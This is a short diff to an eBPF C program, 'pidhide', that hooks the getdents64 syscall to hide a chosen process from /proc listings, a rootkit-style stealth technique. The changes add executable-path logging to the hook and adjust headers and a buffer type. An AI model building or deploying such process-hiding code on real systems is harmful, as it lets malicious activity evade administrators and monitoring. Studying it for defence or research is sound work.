@@ -7,9 +7,6 @@
 
 #include "pidhide.h"
 #include <asm-generic/errno-base.h>
-#include <bpf/bpf_core_read.h>
-#include <bpf/bpf_helpers.h>
-#include <bpf/bpf_tracing.h>
 #include <linux/limits.h>
 // clang-format-on
 
@@ -177,7 +174,7 @@ const volatile int target_ppid = 0;
 // of the PID to hide. This becomes the name
 // of the folder in /proc/
 const volatile int pid_to_hide_len = 0;
-const volatile u8 pid_to_hide[MAX_PID_LEN];
+const volatile char pid_to_hide[100];
 
 // struct linux_dirent64 {
 //     u64        d_ino;    /* 64-bit inode number */
@@ -187,7 +184,6 @@ const volatile u8 pid_to_hide[MAX_PID_LEN];
 //     char           d_name[]; /* Filename (null-terminated) */ };
 // int getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int
 // count);
-
 SEC("tp/syscalls/sys_enter_getdents64")
 int handle_getdents_enter(struct trace_event_raw_sys_enter *ctx) {
   size_t pid_tgid = bpf_get_current_pid_tgid();
@@ -203,6 +199,24 @@ int handle_getdents_enter(struct trace_event_raw_sys_enter *ctx) {
   int pid = pid_tgid >> 32;
   unsigned int fd = ctx->args[0];
   unsigned int buff_count = ctx->args[2];
+
+  struct task_struct *task = (struct task_struct *)bpf_get_current_task();
+  // or struct task_struct *task = (struct task_struct *)ctx->args[0];
+  struct file *file = BPF_CORE_READ(task, mm, exe_file);
+  /* or
+    struct linux_binprm *bprm = (struct linux_binprm *)ctx->args[2];
+    struct file *file = BPF_CORE_READ(bprm, file);
+  */
+  struct path *path = __builtin_preserve_access_index(&file->f_path);
+
+  struct buffer *string_buf = get_buffer();
+  if (string_buf == NULL) {
+    return 0;
+  }
+  u_char *file_path = NULL;
+  get_path_str_from_path(&file_path, path, string_buf);
+
+  bpf_printk("--> %s\n", file_path);
 
   // Store params in map for exit function
   struct linux_dirent64 *dirp = (struct linux_dirent64 *)ctx->args[1];
